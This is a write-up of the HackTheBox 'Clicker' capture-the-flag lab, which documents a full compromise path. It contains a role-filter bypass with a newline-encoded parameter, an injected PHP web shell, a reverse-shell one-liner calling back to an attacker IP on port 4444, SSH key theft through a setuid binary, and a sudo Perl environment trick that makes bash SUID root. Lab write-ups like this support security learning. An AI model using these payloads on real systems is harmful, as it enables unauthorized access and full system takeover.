# CLICKER
after nmapping i can see there is a website 

Trying to play with the game while the big -p- nmap is running / the cookie / the GET parameters nothing looks interresting here

we can mount it there is a mount file sharing open
on the mounted folder i have found a .zip file i download it and unzip it this is the code of the website it seems

in index.php there is a /admin.php that we couldnt see
```
          if ($_SESSION["ROLE"] == "Admin") {
            echo '<a class="nav-link fw-bold py-1 px-0 active" href="/admin.php">Administration</a>';
          } 	 
```
try to go to http://clicker.htb/admin.php we are getting redirect to index

in save_game.php
```
	foreach($_GET as $key=>$value) {
		if (strtolower($key) === 'role') {
			// prevent malicious users to modify role
			header('Location: /index.php?err=Malicious activity detected!');
			die;
		}
		$args[$key] = $value;
	}
```
we can see when you save the game we can have a parameter we didnt saw earlier lets play with it
```
GET /save_game.php?clicks=0&level=0&role=Admin HTTP/1.1
Host: clicker.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://clicker.htb/play.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=hv48e3anl1u77p43o4o95dikos
Connection: close

```
/index.php?err=Malicious activity detected!
thats what i saw in the code so i need to bypass the if in order to change my $_SESSION['ROLE']
```GET /save_game.php?clicks=0&level=0&role%0a=Admin```
```Location: /index.php?msg=Game has been saved!```

so from now we should be admin and access admin.php
took some time to realise i need to disconnnect / reconnect in order for the $_SESSION value to update 
Now we have Administration available in the menu
with an export tool and looks like the export is saving the file in the box
```
Data has been saved in exports/top_players_1r0pcxwv.json
```
take back the code we can see there is only 
if extension = txt
    or = json 
    else 
```
$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
```
so no problem injecting php here we just nee to be able to change the nickname, clicks or level for some php
 
in the code we can see:
```
$currentplayer = get_current_player($_SESSION["PLAYER"]);
```
```
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
```
so the player is all in session 
lets try to exploit that 
```
GET /save_game.php?clicks=1990&level=1990&nickname=<?php system('ls')>
url encoded 
GET /save_game.php?clicks=1990&level=1990&nickname=<%3fphp+system('ls')> HTTP/1.1
```

go to the export page export it as php and its working !
so now we'll make a shell by GET parameters from that
```
GET /save_game.php?clicks=1990&level=1990&nickname=<%3fphp+system($_GET['cmd'])> HTTP/1.1
Host: clicker.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://clicker.htb/play.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=hv48e3anl1u77p43o4o95dikos
Connection: close
````
response 
```
GET /index.php?msg=Game%20has%20been%20saved! HTTP/1.1
```

http://clicker.htb/exports/top_players_pnbzxi8u.php?cmd=id
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)	
```

http://clicker.htb/exports/top_players_pnbzxi8u.php?cmd=php+-r+%27$sock%3dfsockopen(%2210.10.14.28%22,4444)%3bexec(%22/bin/sh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%27

we got a shell

as usual to get a good shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl + z
stty raw -echo; fg
```

in /home we got jack (no access)
nothing look interresting in linpeas 
```
www-data@clicker:/tmp$ ls -lRa /opt
/opt:
total 16
drwxr-xr-x  3 root root 4096 Jul 20 10:00 .
drwxr-xr-x 18 root root 4096 Sep  5 19:19 ..
drwxr-xr-x  2 jack jack 4096 Jul 21 22:29 manage
-rwxr-xr-x  1 root root  504 Jul 20 10:00 monitor.sh

/opt/manage:
total 28
drwxr-xr-x 2 jack jack  4096 Jul 21 22:29 .
drwxr-xr-x 3 root root  4096 Jul 20 10:00 ..
-rw-rw-r-- 1 jack jack   256 Jul 21 22:29 README.txt
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
```
execute query looks interresting trying to play with it the README give some explanations how to use it

Web application Management
Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin

so clearly this executable manage the database of the web server
when i run strings to execute_query i can see 
```
/home/jack/queri
/usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v <
```

we connect to the database with that 
```
mysql -u clicker_db_user -p 
```
and password: clicker_db_password 
cant hashcat the sha256 i found

after some research found that 
```
./execute_query 5 ../.ssh/id_rsa 
```
would read me the file and get me the id_rsa of jack
user.txt is here
```
sudo -l 
```
give me /opt/monitor.sh that i can use as root 
in the script didnt know what this was for so i googled 
```
unset PERL5LIB;
unset PERLLIB;
```

found this https://www.exploit-db.com/exploits/39702
```
sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
bash -p 
```
and rooted

